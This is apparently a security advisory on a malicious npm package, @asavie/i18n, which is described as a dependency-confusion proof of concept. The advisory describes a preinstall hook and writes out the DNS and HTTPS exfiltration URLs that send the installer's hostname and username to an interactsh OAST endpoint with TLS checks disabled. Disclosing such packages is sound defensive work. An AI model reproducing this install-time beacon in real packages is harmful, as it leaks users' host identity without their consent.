summary: Dependency-confusion beacon exfiltrates host identity on install
details: @asavie/i18n declares a `preinstall: node callback.js` lifecycle hook that fires automatically on `npm install`. callback.js reads `os.hostname()` and `os.userInfo().username` and transmits them off-host via two channels: a DNS A-record lookup to `dep-conf.asavie-i18n.<hostname>.<user>.d88sor2o12pnlnd0i1n08ghufaornbr1i.oast.me` and an HTTPS GET to `https://d88sor2o12pnlnd0i1n08ghufaornbr1i.oast.me/dep-conf?h=<hostname>&u=<user>&pkg=asavie-i18n`. The HTTPS request also sets `rejectUnauthorized: false`, disabling TLS certificate validation on the outbound channel. The destination is an interactsh (OAST) subdomain — an out-of-band listener typically used for exfiltration callbacks. The package's own description and README state it is a dependency-confusion proof-of-concept squatting the unclaimed `@asavie` scope referenced by a production application; regardless of stated research intent, any installer who resolves this name from the public registry executes the beacon and leaks host/user identifiers to an attacker-controlled OAST endpoint without consent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
